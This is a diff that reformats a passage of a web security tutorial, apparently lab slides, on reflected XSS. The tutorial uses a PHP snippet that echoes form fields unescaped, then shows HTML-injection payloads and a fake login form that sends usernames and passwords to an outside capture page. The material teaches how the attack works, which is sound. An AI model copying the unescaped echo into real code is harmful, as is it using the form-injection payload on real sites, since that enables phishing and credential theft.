@@ -244,40 +244,58 @@ Remember: HTTP is stateless!
   - Password Cracking Tool: [John the Ripper](https://www.openwall.com/john/)
 
 
-So we're done! ... right?
-We avoided server-side attacks! Yay!
-… but what about the users?
-Remember that “Read GET parameters” slide?
-Did we see a “Read GET parameters - EXPLOIT”?
-“Well, no… but how can we exploit such a simple script?”
-
-Read GET parameters - EXPLOIT
-XSS Reflected (a.k.a. “why would I ever attack myself?”)
+## XSS Reflected (a.k.a. “why would I ever attack myself?”)
 You may use the Simple HTML Form, if you wish (and please, use Firefox for this part)
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
-Payload:
-firstname:		John
-lastname:		Doe
-Output: 		Hello John Doe
 
-Read GET parameters - EXPLOIT
-XSS Reflected
-We can try adding some HTML to our parameters and see if the page renders it
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
+Code:
+```
+$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
 Payload:
+
+- firstname: `John`
+- lastname:	`Doe`
+- Output: `Hello John Doe`
+
+## XSS Reflected
+
+We can try adding some HTML to our parameters and see if the page renders it
+
+Code: 			
+```
+$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
+
+Payload:
+```
 firstname:		<i>John</i>
-lastname:		<u>Doe</u>
+lastname:		<u>Doe</u>
 Output: 		Hello John Doe!
+```
+## XSS Reflected
 
-Read GET parameters - EXPLOIT
-XSS Reflected
 Form Injection
+
 By adding custom HTML, we can try and go for a Phishing Attack
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
+
+Code: 			
+```
+$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
+
 Payload:
-firstname:		<form action=”http://www.mysite.it/capture_page.php”>				Username: <input name=”user” type=”text”/><br/>
-lastname:			Password: <input name=”pass” type=”password”/>			</form>
-Output: 		Hello [ Fake login form ]!
+```
+firstname: `<form action=”http://www.mysite.it/capture_page.php”>
+                Username: <input name=”user” type=”text”/><br/>`
+lastname:  `Password: <input name=”pass” type=”password”/>
+            </form>`
+Output:    `Hello [ Fake login form ]!`
 
 Read GET parameters - EXPLOIT
 XSS Reflected
